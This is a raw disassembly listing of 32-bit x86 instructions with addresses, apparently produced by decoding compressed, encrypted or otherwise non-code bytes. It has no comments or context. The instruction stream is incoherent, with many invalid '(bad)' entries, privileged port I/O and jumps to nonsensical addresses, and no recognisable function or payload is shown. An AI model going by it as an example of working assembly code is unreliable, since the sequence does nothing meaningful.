  4105bf:	or     BYTE PTR [ecx+eiz*8+0x24],cl
  4105c3:	adc    DWORD PTR ds:0x30d105f,ebp
  4105c9:	(bad)  [edi+edx*1-0x1ce813df]
  4105d0:	mov    edi,0xe8184655
  4105d5:	jne    0x410635
  4105d7:	les    edi,FWORD PTR [edi-0x2e]
  4105da:	fsubr  QWORD PTR [ecx+0x58cfa318]
  4105e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4105e1:	and    DWORD PTR [eax+0x29df0dfa],esi
  4105e7:	mov    ds:0xe74593e3,al
  4105ec:	push   ds
  4105ed:	sub    al,0xba
  4105ef:	fwait
  4105f0:	ret    0xfeef
  4105f3:	add    al,BYTE PTR [edx]
  4105f5:	ret    0xee29
  4105f8:	jp     0x410641
  4105fa:	xchg   ebp,eax
  4105fb:	xor    eax,0xbef43154
  410600:	dec    edx
  410601:	in     eax,0xf0
  410603:	stos   DWORD PTR es:[edi],eax
  410604:	scas   eax,DWORD PTR es:[edi]
  410605:	inc    ebx
  410606:	sub    eax,0xfdd0e749
  41060b:	dec    ebx
  41060c:	arpl   WORD PTR [eax-0x18f3024],cx
  410612:	sti    
  410613:	push   ss
  410614:	adc    eax,0x6fb6b031
  410619:	test   BYTE PTR [ebx+0x1ec7be56],dh
  41061f:	in     eax,dx
  410620:	pusha  
  410621:	pop    eax
  410622:	shl    BYTE PTR [esi],cl
  410624:	sbb    al,0x48
  410626:	push   eax
  410627:	inc    ecx
  410628:	mov    BYTE PTR [ebx+edx*1+0xf],dh
  41062c:	and    esp,DWORD PTR [ecx-0x4e]
  41062f:	push   ds
  410630:	mov    ecx,0x5558235f
  410635:	add    al,0x5
  410637:	cwde   
  410638:	cmp    BYTE PTR [esi+0x74ee7fbe],ch
  41063e:	in     eax,0x4b
  410640:	pushf  
  410641:	inc    edx
  410642:	push   es
  410643:	outs   dx,DWORD PTR ds:[esi]
  410644:	add    eax,edi
  410646:	aad    0x1
  410648:	cld    
  410649:	jmp    0x8011:0xa6e3e98b
  410650:	int    0xb2
  410652:	es push cs
  410654:	or     esp,DWORD PTR [esi-0x6257fd83]
  41065a:	adc    eax,0xd27ace7f
  41065f:	int3   
  410660:	push   ds
  410661:	cwde   
  410662:	out    0xb5,al
  410664:	and    BYTE PTR [esi],cl
  410666:	push   esi
  410667:	lods   eax,DWORD PTR ds:[esi]
  410668:	add    al,0x9b
  41066a:	push   edx
  41066b:	and    al,0x66
  41066d:	hlt    
  41066e:	cwde   
  41066f:	dec    eax
  410670:	xchg   esp,eax
  410671:	(bad)  
  410672:	and    BYTE PTR [edi],ch
  410674:	pop    edx
  410675:	in     al,0x1
  410677:	push   ss
  410678:	pop    ds
  410679:	mov    BYTE PTR [edi+0x72],0x23
  41067d:	scas   eax,DWORD PTR es:[edi]
  41067e:	stos   DWORD PTR es:[edi],eax
  41067f:	(bad)  
  410681:	xor    ah,dl
  410683:	mov    esp,0x6604ab11
  410688:	inc    ecx
  410689:	pop    ebp
  41068a:	stos   DWORD PTR es:[edi],eax
  41068b:	lahf   
  41068c:	rcr    DWORD PTR [esi+0x45],0xc2
  410690:	inc    edi
  410691:	lock mov edx,0x7dbf7724
  410697:	sub    al,0xb9
  410699:	scas   eax,DWORD PTR es:[edi]
  41069a:	push   cs
  41069b:	stc    
  41069c:	jmp    0x4106e2
  41069e:	jmp    0xbe1d:0x2a9b60ce
  4106a5:	mov    dl,0x66
  4106a7:	push   ebx
  4106a8:	and    eax,0xac2c2fde
  4106ad:	adc    BYTE PTR [edx-0x11],cl
  4106b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4106b1:	xor    eax,0x2daca519
  4106b6:	sub    dh,BYTE PTR [esi-0x51]
  4106b9:	test   al,0x92
  4106bb:	call   0xe8fc1756
  4106c0:	jge    0x4106b0
  4106c2:	pushf  
  4106c3:	out    dx,eax
  4106c4:	out    0xcb,eax
  4106c6:	test   DWORD PTR [esi],0xa04031e2
  4106cc:	push   cs
  4106cd:	hlt    
  4106ce:	inc    esi
  4106cf:	jns    0x41071f
  4106d1:	inc    esi
  4106d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4106d3:	fs and al,0xbb
  4106d6:	fadd   DWORD PTR [ebp*4+0x737a42df]
  4106dd:	and    eax,0x322924e0
  4106e2:	enter  0xf989,0x80
  4106e6:	(bad)  
  4106e7:	int    0xd6
  4106e9:	pop    edx
  4106ea:	aam    0x78
  4106ec:	aas    
  4106ed:	daa    
  4106ee:	lods   al,BYTE PTR ds:[esi]
  4106ef:	sahf   
  4106f0:	sbb    al,0xb5
  4106f2:	add    al,0x6d
  4106f4:	(bad)  
  4106f5:	cmp    ah,bl
  4106f7:	push   ebx
  4106f8:	nop
  4106f9:	inc    esi
  4106fa:	jge    0x4106cb
  4106fc:	loop   0x41069e
  4106fe:	rcl    DWORD PTR [edi+0x20],0xc3
  410702:	out    dx,eax
  410703:	push   ebx
  410704:	mov    ebx,edi
  410706:	sub    bh,BYTE PTR [edi-0x14c0307e]
  41070c:	les    edi,FWORD PTR [esi]
  41070e:	jl     0x4106b8
  410710:	lahf   
  410711:	mov    DWORD PTR [edx-0x4d],eax
  410714:	push   ebp
  410715:	fld    QWORD PTR [ebx-0x9]
  410718:	fwait
  410719:	repz mov bh,0x26
  41071c:	test   DWORD PTR [ecx+0x24],ebx
  41071f:	jo     0x410726
  410721:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410722:	out    dx,eax
  410723:	daa    
  410724:	sar    BYTE PTR [esi],cl
  410726:	popa   
  410727:	sbb    dl,BYTE PTR [edx+ebx*1-0x2f]
  41072b:	dec    DWORD PTR [eax+esi*1+0x58]
  41072f:	sbb    cl,BYTE PTR [ebp-0x69419cdb]
  410735:	dec    ecx
  410736:	jo     0x410703
  410738:	cli    
  410739:	dec    edx
  41073a:	or     al,0xad
  41073c:	and    DWORD PTR [esi+0x71],ebp
  41073f:	jecxz  0x410736
  410741:	das    
  410742:	or     al,0xf6
  410744:	cmp    al,0xff
  410746:	push   es
  410747:	jns    0x4107bd
  410749:	test   esp,ecx
  41074b:	outs   dx,DWORD PTR ds:[esi]
  41074c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41074d:	mov    esi,DWORD PTR [edi]
  41074f:	addr16 inc edx
  410751:	mov    esp,0x19a21c6e
  410756:	loopne 0x4107bd
  410758:	mov    esi,0x90301e68
  41075d:	shr    DWORD PTR [ebx+ebx*1-0x6fb61867],cl
  410764:	retf   
  410765:	in     eax,dx
  410766:	ret    0xd7d9
  410769:	xchg   ebp,eax
  41076a:	jnp    0x410772
  41076c:	jle    0x410771
  41076e:	xchg   ebx,eax
  41076f:	js     0x4106f8
  410771:	or     al,0xa
  410773:	test   BYTE PTR [edx-0x5e9f033f],bh
  410779:	jmp    0x4107d0
  41077b:	mov    eax,0xe7578ff9
  410780:	sahf   
  410781:	leave  
  410782:	stc    
  410783:	and    al,0xb5
  410785:	push   ebp
  410786:	and    BYTE PTR ds:0x651a9b6,dl
  41078c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41078d:	daa    
  41078e:	pop    ebp
  41078f:	daa    
  410790:	and    al,0x99
  410792:	ja     0x41075b
  410794:	sbb    eax,0xdcb4b29
  410799:	mov    esi,0xd63f1eae
  41079e:	imul   ecx,DWORD PTR [edi+0x75],0x9bf4583e
  4107a5:	and    al,0x6a
  4107a7:	rcl    DWORD PTR [ebp-0x7da70641],0xe
  4107ae:	mov    dl,0x43
  4107b0:	or     cl,BYTE PTR [edi]
  4107b2:	jo     0x4107eb
  4107b4:	pop    eax
  4107b5:	retf   
  4107b6:	scas   al,BYTE PTR es:[edi]
  4107b7:	dec    ebp
  4107b8:	into   
  4107b9:	mov    cl,0x31
  4107bb:	enter  0xfb16,0x61
  4107bf:	fcomp  QWORD PTR [edi+0x6139a8a6]
  4107c5:	inc    esi
  4107c6:	inc    edi
  4107c7:	mov    dl,0x42
  4107c9:	and    edx,DWORD PTR ds:0x2f42472c
  4107cf:	xor    BYTE PTR [ecx+eiz*8+0x3e3ef2b8],dl
  4107d6:	stc    
  4107d7:	add    ecx,ebx
  4107d9:	mov    edx,0x3fde7216
  4107de:	sub    eax,0xacef8403
  4107e3:	pop    edx
  4107e4:	cwde   
  4107e5:	sbb    ah,BYTE PTR [edx-0xe]
  4107e8:	in     al,dx
  4107e9:	dec    esi
  4107ea:	imul   eax,DWORD PTR [eax],0x13
  4107ed:	xlat   BYTE PTR ds:[ebx]
  4107ee:	int    0x3
  4107f0:	or     ah,BYTE PTR [eax+0x1b]
  4107f3:	sbb    eax,DWORD PTR [ebp+0x3f6afc69]
  4107f9:	ffreep st(5)
  4107fb:	int3   
  4107fc:	dec    ebx
  4107fd:	shr    DWORD PTR [edi+ecx*2+0x5f37e4af],0x38
  410805:	mov    eax,ds:0x54d4b7c8
  41080a:	ret    0x9802
  41080d:	lahf   
  41080e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41080f:	lea    ebp,[eax]
  410811:	(bad)  
  410812:	push   ebx
  410813:	inc    ebx
  410814:	jns    0x4107f4
  410816:	sar    BYTE PTR [edi-0x49583f4a],0xa1
  41081d:	push   es
  41081e:	cmp    ebx,DWORD PTR [edi]
  410820:	test   BYTE PTR [edx],cl
  410822:	call   FWORD PTR ds:0x319fca9c
  410828:	popf   
  410829:	jno    0x41086c
  41082b:	js     0x41082a
  41082d:	lds    esp,FWORD PTR [esi+0x78]
  410830:	sub    DWORD PTR [esi+0x1],ebp
  410833:	cmc    
  410834:	xchg   ebx,eax
  410836:	or     eax,DWORD PTR [edx+0x365acb40]
  41083c:	mov    es,edi
  41083e:	(bad)  
  41083f:	(bad)  
  410840:	out    0x23,al
  410842:	pop    ebp
  410843:	adc    BYTE PTR [esi-0x27],dh
  410846:	cmp    bh,bl
  410848:	push   esp
  410849:	in     eax,dx
  41084a:	push   0xf37cc0f8
  41084f:	cmp    dh,dh
  410851:	inc    esp
  410852:	push   eax
  410853:	sub    DWORD PTR [edx],edx
  410855:	pusha  
  410856:	xchg   edi,eax
  410857:	pushf  
  410858:	add    BYTE PTR [esi-0x6637ffb0],cl
  41085e:	xchg   ebp,eax
  41085f:	sub    al,0x7a
  410861:	pop    ecx
  410862:	ficomp DWORD PTR [ebx+0x19]
  410865:	ja     0x410808
  410867:	xchg   ecx,edx
  410869:	sub    DWORD PTR [ebp+0x42889c56],ebp
  41086f:	xor    bh,al
  410871:	das    
  410872:	pop    ds
  410873:	(bad)  [ebx*4+0x9cca820]
  41087a:	cmp    eax,esi
  41087c:	je     0x4108eb
  41087e:	fcmove st,st(1)
  410880:	adc    eax,0xdde367c
  410885:	ret    0x9c84
  410888:	repnz ds add eax,0xf884705
  41088f:	test   BYTE PTR [ebp+0x1d],0x9f
  410893:	nop
  410894:	add    eax,0x3f3a7a9c
  410899:	test   BYTE PTR [edi-0x58],dh
  41089c:	lods   eax,DWORD PTR ds:[esi]
  41089d:	mov    BYTE PTR [esi-0x79],dh
  4108a0:	retf   
  4108a1:	iret   
  4108a2:	mov    ah,0xad
  4108a4:	and    cl,BYTE PTR [eax]
  4108a6:	pop    edi
  4108a7:	and    bh,BYTE PTR [esp+edx*2]
  4108aa:	xor    dl,ch
  4108ac:	add    BYTE PTR ds:0x893fc0c7,al
  4108b2:	sub    DWORD PTR [ecx-0x50],ecx
  4108b5:	push   cs
  4108b6:	mov    ebx,0x6327b76
  4108bb:	call   0xe94d0fc9
  4108c0:	push   ebp
  4108c1:	cmp    BYTE PTR [edx-0x3c],0x40
  4108c5:	(bad)  
  4108c6:	jle    0x410905
  4108c8:	push   edx
  4108c9:	loopne 0x4108f5
  4108cb:	jb     0x4108b1
  4108cd:	sub    eax,DWORD PTR [ecx+ecx*2+0x66]
  4108d1:	or     al,0xf9
  4108d3:	or     eax,0x4e96a0d8
  4108d8:	lock add esp,DWORD PTR [ebx]
  4108db:	out    dx,eax
  4108dc:	pop    edx
  4108dd:	push   ecx
  4108de:	retf   0xab7d
  4108e1:	out    dx,eax
  4108e2:	enter  0x8c8d,0x34
  4108e6:	add    edi,esp
  4108e8:	imul   ebx,DWORD PTR [ecx],0xf
  4108eb:	mov    esi,0xf9d3509a
  4108f0:	pop    esp
  4108f1:	test   BYTE PTR [esi-0x32],bh
  4108f4:	fnstenv [eax+esi*1+0x3f]
  4108f8:	dec    DWORD PTR [edx+0x4]
  4108fb:	xchg   edx,eax
  4108fc:	xlat   BYTE PTR ds:[ebx]
  4108fd:	cs addr16 jg 0x41090e
  410901:	clc    
  410902:	addr16 loopne 0x410977
  410905:	mov    ebp,0x42bac485
  41090a:	mov    WORD PTR [ebp-0x5465497a],?
  410910:	sub    al,0xed
  410912:	in     al,dx
  410913:	ror    BYTE PTR [ebx+0x3c],cl
  410916:	add    al,0x8d
  410918:	and    esi,edi
  41091a:	lods   al,BYTE PTR ds:[esi]
  41091b:	out    0xf3,al
  41091d:	jno    0x410965
  41091f:	sub    DWORD PTR [ecx+0x244a7dd5],ebx
  410925:	sub    edi,DWORD PTR [eax]
  410927:	mov    esi,0xe4cd91e6
  41092c:	aaa    
  41092d:	clc    
  41092e:	mov    WORD PTR [eax],fs
  410930:	div    DWORD PTR [ecx]
  410932:	test   DWORD PTR [edi+0x2d9f2d11],esp
  410938:	sbb    DWORD PTR [ebx+0x70],ebx
  41093b:	pop    eax
  41093c:	stos   BYTE PTR es:[edi],al
  41093d:	mov    bh,BYTE PTR [ebx]
  41093f:	xchg   esp,eax
  410940:	imul   ebp,eax,0x427eb9c5
  410946:	sbb    ch,BYTE PTR [ebx-0x3892d26]
  41094c:	in     eax,0x45
  41094e:	loope  0x4109bc
  410950:	xor    BYTE PTR cs:[ecx+0x1c],dl
  410954:	cdq    
  410955:	sub    edx,DWORD PTR [edx]
  410957:	arpl   bx,cx
  410959:	cmp    edx,DWORD PTR [ebp+0x7a]
  41095c:	into   
  41095d:	lock icebp 
  41095f:	adc    dl,bl
  410961:	fs push esp
  410963:	pop    ebp
  410964:	out    dx,al
  410965:	cmp    bh,BYTE PTR [ecx+eiz*1]
  410968:	out    dx,al
  410969:	pop    esi
  41096a:	ins    DWORD PTR es:[edi],dx
  41096b:	mov    ebx,cs
  41096d:	lods   eax,DWORD PTR ds:[esi]
  41096e:	nop
  41096f:	xor    dh,bh
  410971:	pushf  
  410972:	add    eax,0xc8bc729d
  410977:	sub    esp,DWORD PTR ds:0xc598306f
  41097d:	outs   dx,DWORD PTR ds:[esi]
  41097e:	cvtdq2ps xmm0,XMMWORD PTR ds:0x796d2edf
  410985:	add    esi,DWORD PTR [edi-0x73]
  410988:	lods   eax,DWORD PTR ds:[esi]
  410989:	fisubr WORD PTR [esp+esi*4]
  41098c:	dec    ecx
  41098d:	and    esp,DWORD PTR [edx+0x46]
  410990:	outs   dx,DWORD PTR ds:[esi]
  410991:	scas   al,BYTE PTR es:[edi]
  410992:	mov    dl,0x5
  410994:	div    BYTE PTR [edi+esi*8+0x38]
  410998:	icebp  
  410999:	cmp    DWORD PTR [esp+edi*8],ebx
  41099c:	push   ss
  41099d:	int3   
  41099e:	lea    ebp,[eax-0x6f408d90]
  4109a4:	or     esi,DWORD PTR [ebx-0xa]
  4109a7:	sbb    esp,edx
  4109a9:	inc    esi
  4109aa:	mov    edx,0xcefa8b1d
  4109af:	imul   edi,DWORD PTR [eax+0x48],0xf57790bd
  4109b6:	add    esi,DWORD PTR [ebx+0x48868941]
  4109bc:	test   eax,0x3335ecbe
  4109c1:	xchg   esp,eax
  4109c2:	or     DWORD PTR [ebx],ecx
  4109c4:	cld    
  4109c5:	sahf   
  4109c6:	jbe    0x4109d5
  4109c8:	mov    ch,BYTE PTR [eax+eax*8-0x49576ee7]
  4109cf:	(bad)  
  4109d0:	repz add eax,0x4cf02183
  4109d6:	retf   0xe2b4
  4109d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4109da:	stos   DWORD PTR es:[edi],eax
  4109db:	fcmovnbe st,st(0)
  4109dd:	fisub  WORD PTR [eax-0xdc38b84]
  4109e3:	pop    ebx
  4109e4:	imul   edi,DWORD PTR [edx+0x209c7291],0xffffff92
  4109eb:	xchg   edi,eax
  4109ec:	(bad)  
  4109ed:	and    bh,bl
  4109ef:	xchg   BYTE PTR [edx+ebp*8],cl
  4109f2:	fs shl ebx,1
  4109f5:	in     eax,dx
  4109f6:	nop
  4109f7:	push   cs
  4109f8:	mov    ah,0xc7
  4109fa:	cld    
  4109fb:	stos   BYTE PTR es:[edi],al
  4109fc:	xor    DWORD PTR [ecx-0x213b7eeb],0x1d
  410a03:	push   cs
  410a04:	sub    bl,BYTE PTR [ecx+0x687085ff]
  410a0a:	dec    edi
  410a0b:	les    ebp,FWORD PTR [esi+0x431ada1]
  410a11:	test   BYTE PTR [ebx],bh
  410a13:	repz mov ds:0x24ae175f,eax
  410a19:	int    0xb4
  410a1b:	or     edx,DWORD PTR [ecx-0x2b]
  410a1e:	dec    ebp
  410a1f:	push   esp
  410a20:	iret   
  410a21:	dec    edi
  410a22:	adc    al,0xc6
  410a24:	(bad)  
  410a25:	fidiv  DWORD PTR [esi-0x6993b841]
  410a2b:	sbb    BYTE PTR [eax-0x21],ah
  410a2e:	icebp  
  410a2f:	xchg   ebx,eax
  410a30:	mov    bl,0x68
  410a32:	jae    0x410a8e
  410a34:	out    0xf5,eax
  410a36:	ret    0xd1fb
  410a39:	icebp  
  410a3a:	adc    edi,ecx
  410a3c:	(bad)  
  410a3d:	sbb    dh,BYTE PTR [ebp-0xf]
  410a40:	adc    edx,DWORD PTR [edi]
  410a42:	icebp  
  410a43:	in     eax,0x44
  410a45:	pop    eax
  410a46:	cmp    eax,0x1f3d2b51
  410a4b:	jo     0x4109d8
  410a4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a4e:	ins    DWORD PTR es:[edi],dx
  410a4f:	sbb    ebp,edx
  410a51:	and    al,0x56
  410a53:	dec    ebx
  410a54:	mov    ecx,esi
  410a56:	ja     0x410abe
  410a58:	fild   DWORD PTR [edi+0x78]
  410a5b:	pop    edx
  410a5c:	xchg   ebp,eax
  410a5d:	sub    al,0x87
  410a5f:	ror    DWORD PTR [ebx],0xb
  410a62:	pop    esp
  410a63:	xchg   BYTE PTR [edi],bl
  410a65:	xchg   DWORD PTR [edi+ecx*4+0x37],ecx
  410a69:	push   ss
  410a6a:	stc    
  410a6b:	jae    0x410a7b
  410a6d:	push   ss
  410a6e:	push   esp
  410a6f:	add    cl,dh
  410a71:	je     0x410abc
  410a73:	loope  0x410af4
  410a75:	js     0x410a7c
  410a77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a78:	sti    
  410a79:	retf   
  410a7a:	mov    al,ds:0x875bdace
  410a7f:	daa    
  410a80:	xchg   ebx,eax
  410a81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a82:	xor    DWORD PTR [edx+0x6e],ecx
  410a85:	mov    edi,0xe074e1bb
  410a8a:	mov    eax,ds:0xdc994899
  410a8f:	cs dec ebp
  410a91:	shl    BYTE PTR [edx],cl
  410a93:	shl    bl,0x25
  410a96:	mov    esi,0x8c0eefd2
  410a9b:	in     al,0x56
  410a9d:	xchg   ebx,eax
  410a9e:	int3   
  410a9f:	cld    
  410aa0:	pop    ecx
  410aa1:	rol    BYTE PTR [ecx-0x42021a9b],1
  410aa7:	mov    eax,0x9ba50aad
  410aac:	aam    0x64
  410aae:	(bad)  
  410aaf:	sti    
  410ab0:	jbe    0x410a9b
  410ab2:	dec    edi
  410ab3:	push   ebx
  410ab4:	repz sti 
  410ab6:	repnz rcr BYTE PTR [edx+0x39],1
  410aba:	mov    eax,ds:0x66bd86e4
  410abf:	jge    0x410b0c
  410ac1:	mov    es,WORD PTR [esi+esi*1+0x753880c6]
  410ac8:	xchg   ebp,eax
  410ac9:	mov    dl,0x82
  410acb:	mov    bl,BYTE PTR [esi]
  410acd:	push   ebp
  410ace:	adc    dl,BYTE PTR [esi-0x30e3ae98]
  410ad4:	es (bad) 
  410ad6:	popa   
  410ad7:	mov    ch,0xf5
  410ad9:	call   0x8251:0x399aabe3
  410ae0:	mov    ecx,0xb2bcdf77
  410ae5:	mov    bh,0xf8
  410ae7:	popa   
  410ae8:	or     bh,dh
  410aea:	sbb    ch,al
  410aec:	fwait
  410aed:	or     BYTE PTR ds:0xb50489c4,dh
  410af3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410af4:	arpl   si,ax
  410af6:	xlat   BYTE PTR ds:[ebx]
  410af7:	imul   esp,DWORD PTR [ebp+0x3c],0xffffffb4
  410afb:	sub    ah,BYTE PTR [ecx+0x1b]
  410afe:	mov    BYTE PTR [esi-0x6b],dh
  410b01:	mov    ds:0x699e551d,eax
  410b06:	mov    esp,0x1836c063
  410b0b:	mov    ds:0x7c54695c,al
  410b10:	aas    
  410b11:	(bad)  
  410b12:	adc    DWORD PTR [eax],ecx
  410b14:	cld    
  410b15:	mov    al,ds:0x870e9b5f
  410b1a:	popa   
  410b1b:	cld    
  410b1c:	aaa    
  410b1d:	cld    
  410b1e:	in     al,0xaa
  410b20:	xchg   edi,eax
  410b21:	xor    DWORD PTR [eax],edx
  410b23:	cdq    
  410b24:	inc    ebp
  410b25:	sbb    eax,0x791cc468
  410b2a:	mov    edx,0x837504c9
  410b2f:	cmp    eax,0x6ea6c562
  410b34:	cwde   
  410b35:	or     ebx,DWORD PTR [edi+0x6f]
  410b38:	stos   BYTE PTR es:[edi],al
  410b39:	(bad)  
  410b3a:	stc    
  410b3b:	mov    ah,0xbb
  410b3d:	sbb    ebp,DWORD PTR [eax]
  410b3f:	add    BYTE PTR [edi+0x5b],al
  410b42:	sub    eax,0x54c35283
  410b47:	fs sbb al,0x6e
  410b4a:	or     BYTE PTR [edx-0x5f2c870c],bl
  410b50:	clc    
  410b51:	int3   
  410b52:	(bad)  
  410b53:	popf   
  410b54:	inc    esp
  410b55:	xor    eax,0x8f2579fb
  410b5a:	stos   BYTE PTR es:[edi],al
  410b5b:	scas   al,BYTE PTR es:[edi]
  410b5c:	fldln2 
  410b5e:	mov    bl,0xca
  410b60:	inc    edx
  410b61:	xor    DWORD PTR [edx],eax
  410b63:	in     eax,dx
  410b64:	and    edx,edx
  410b66:	sub    eax,0x2e0c67ec
  410b6b:	mov    al,ds:0x8b2311d9
  410b70:	ja     0x410af5
  410b72:	and    DWORD PTR [edi],edi
  410b74:	(bad)  
  410b75:	neg    DWORD PTR [edi-0x63]
  410b78:	xchg   ecx,eax
  410b79:	punpckhbw mm0,QWORD PTR [esi]
  410b7c:	add    dl,BYTE PTR [ebx]
  410b7e:	cmp    bl,dh
  410b80:	gs mov esi,0xd24a873d
  410b86:	push   esi
  410b87:	in     al,0xac
  410b89:	in     eax,0xc4
  410b8b:	jmp    0x410bc5
  410b8d:	xor    edx,DWORD PTR [edi+0xe]
  410b90:	aaa    
  410b91:	sub    eax,eax
  410b93:	inc    ax
  410b95:	add    DWORD PTR [edi-0x57],ecx
  410b98:	jno    0x410bc4
  410b9a:	or     DWORD PTR [esi+ebp*8-0x40],esi
  410b9e:	jae    0x410bb4
  410ba0:	mov    esi,0x8436aa7b
  410ba5:	aaa    
  410ba6:	pop    ebx
  410ba7:	(bad)  
  410ba8:	(bad)  
  410ba9:	jmp    0x410b8d
  410bab:	sub    ebx,DWORD PTR [ebp+ebp*2+0x5e]
  410baf:	dec    edx
  410bb0:	pcmpgtd mm4,QWORD PTR [esp+eax*4-0x26]
  410bb5:	repz cmc 
  410bb7:	arpl   bp,sp
  410bb9:	xchg   DWORD PTR [ecx+0x366b243f],esi
  410bbf:	push   esp
  410bc0:	cwde   
  410bc1:	in     al,0xc9
  410bc3:	or     ebx,edi
  410bc5:	ror    DWORD PTR [edx],cl
  410bc7:	adc    esp,ebx
  410bc9:	push   ss
  410bca:	out    dx,al
  410bcb:	cld    
  410bcc:	push   ebp
  410bcd:	xchg   ecx,eax
  410bce:	lods   eax,DWORD PTR ds:[esi]
  410bcf:	dec    ecx
  410bd0:	js     0x410bf6
  410bd2:	out    dx,eax
  410bd3:	in     eax,0x97
  410bd5:	push   0x4ce94ea8
  410bda:	ins    BYTE PTR es:[edi],dx
  410bdb:	sbb    al,BYTE PTR [eax-0x2a60b723]
  410be1:	and    ch,0x9e
  410be4:	gs fwait
  410be6:	mov    al,0x93
  410be8:	push   eax
  410be9:	cmp    DWORD PTR [edi],0xffffff9d
  410bec:	pop    ss
  410bed:	jmp    0x410b6f
  410bef:	mov    WORD PTR [ecx-0x26],ss
  410bf2:	adc    eax,0x4629563b
  410bf7:	or     al,0x98
  410bf9:	ret    0xc5a0
  410bfc:	ret    
  410bfd:	and    eax,0x4c104bb6
  410c02:	dec    edi
  410c03:	add    dh,BYTE PTR [eax+0x8]
  410c06:	push   0x32
  410c08:	retf   0x2e64
  410c0b:	pusha  
  410c0c:	cwde   
  410c0d:	fdivr  st,st(7)
  410c0f:	rol    ah,1
  410c11:	and    eax,0x4cbe2a9
  410c16:	bound  ecx,QWORD PTR [ebx-0x33]
  410c19:	addr16 int 0x29
  410c1c:	and    DWORD PTR [esi+0x55daa2de],0x62
  410c23:	mov    edx,0x2b44f888
  410c28:	jle    0x410c89
  410c2a:	adc    DWORD PTR [edx+edx*8+0x1f],edx
  410c2e:	out    0x5c,eax
  410c30:	loopne 0x410c68
  410c32:	or     al,0xf9
  410c34:	(bad)  
  410c35:	pop    edx
  410c36:	push   ss
  410c37:	mov    esp,0xfcdf7146
  410c3c:	pop    edx
  410c3d:	dec    esi
  410c3e:	pop    ebx
  410c40:	and    ch,BYTE PTR [ebx+0x4e2cda9f]
  410c46:	xchg   esp,eax
  410c47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c48:	and    eax,0xbbfbab0b
  410c4d:	mov    WORD PTR [ebx+0x4ebe5d02],gs
  410c53:	xlat   BYTE PTR ds:[ebx]
  410c54:	mov    eax,0x130688fa
  410c59:	jb     0x410c72
  410c5b:	mov    dh,BYTE PTR [eax]
  410c5d:	leave  
  410c5e:	jmp    0x41f14cb9
  410c63:	xlat   BYTE PTR ds:[ebx]
  410c64:	inc    eax
  410c65:	and    eax,0x4efab0fc
  410c6a:	adc    ecx,edi
  410c6c:	inc    edi
  410c6d:	(bad)  
  410c6e:	jmp    0xc1b:0x75089936
  410c75:	ds cmp eax,0x4a3cdda9
  410c7b:	inc    ebp
  410c7c:	xor    ebp,DWORD PTR [ebx-0x340e4ff2]
  410c82:	lods   eax,DWORD PTR ds:[esi]
  410c83:	jle    0x410ca2
  410c85:	cmp    ebx,DWORD PTR [eax]
  410c87:	(bad)  
  410c88:	leave  
  410c89:	ror    DWORD PTR [ebx],cl
  410c8b:	mov    ah,0x3e
  410c8d:	pop    edi
  410c8e:	jle    0x410c48
  410c90:	mov    ebp,0x1f250680
  410c95:	jne    0x410c70
	...
  410d13:	add    BYTE PTR [ecx-0x4046497c],bh
  410d19:	mov    ebx,0xac284bf
  410d1e:	mov    ebp,DWORD PTR [edx+0x42]
  410d21:	jb     0x410d40
  410d23:	mov    edi,0xb7c2
  410d28:	imul   eax,DWORD PTR [edi],0x0
  410d2b:	add    BYTE PTR [ebx],bh
  410d2d:	xor    eax,0x2e874589
  410d32:	xlat   BYTE PTR ds:[ebx]
  410d33:	sbb    bh,ah
  410d35:	pop    ds
  410d36:	sahf   
  410d37:	lods   al,BYTE PTR ds:[esi]
  410d38:	mov    ds:0x91fc0d9,al
  410d3d:	mov    al,ds:0x17cfdb29
  410d42:	sbb    al,0x6f
  410d44:	pop    es
  410d45:	(bad)  
  410d46:	sbb    ch,bl
  410d48:	clc    
  410d49:	mov    ecx,0x7e089722
  410d4e:	mov    ebx,0xa04fa84a
  410d53:	cmp    BYTE PTR [eax-0xb09db72],bh
  410d59:	or     BYTE PTR [esi-0x40b4a061],bl
  410d5f:	dec    esp
  410d60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d61:	inc    esi
  410d62:	daa    
  410d63:	(bad)  
  410d64:	adc    dh,dl
  410d66:	add    eax,0x3274b85
  410d6b:	scas   eax,DWORD PTR es:[edi]
  410d6c:	add    eax,0x9d67eff5
  410d71:	enter  0xd8b5,0x4d
  410d75:	dec    esp
  410d76:	xor    DWORD PTR [esi],ebp
  410d78:	or     BYTE PTR ds:0xf0dfe0be,cl
  410d7e:	sbb    eax,0x196ce7bd
  410d83:	mov    bl,0x8b
  410d85:	imul   ebx,DWORD PTR [eax+0x31b81460],0xffffff89
  410d8c:	xchg   edi,eax
  410d8d:	cmc    
  410d8e:	mov    al,0xfc
  410d90:	ds xchg esi,eax
  410d92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d93:	imul   eax,DWORD PTR [eax-0x5c],0xffffffca
  410d97:	test   ecx,ebx
  410d99:	nop
  410d9a:	ds int 0x90
  410d9d:	(bad)  
  410d9e:	adc    al,0x46
  410da0:	loopne 0x410e0f
  410da2:	lods   al,BYTE PTR ds:[esi]
  410da3:	lds    edx,FWORD PTR [eax+ebx*8+0x21]
  410da7:	jp     0x410d8d
  410da9:	pop    esp
  410daa:	stos   BYTE PTR es:[edi],al
  410dab:	(bad)  
  410dac:	cwde   
  410dad:	mov    dl,0xae
  410daf:	shr    DWORD PTR [edi+0x6940bb11],1
  410db5:	cmp    eax,0x317c8dc2
  410dba:	cld    
  410dbb:	or     eax,0x2f91b98b
  410dc0:	mov    ebx,0xd2323b79
  410dc5:	push   ecx
  410dc6:	push   eax
  410dc7:	sub    eax,0xe7e88d2
  410dcc:	add    ecx,esp
  410dce:	mov    al,ds:0x7dcb3611
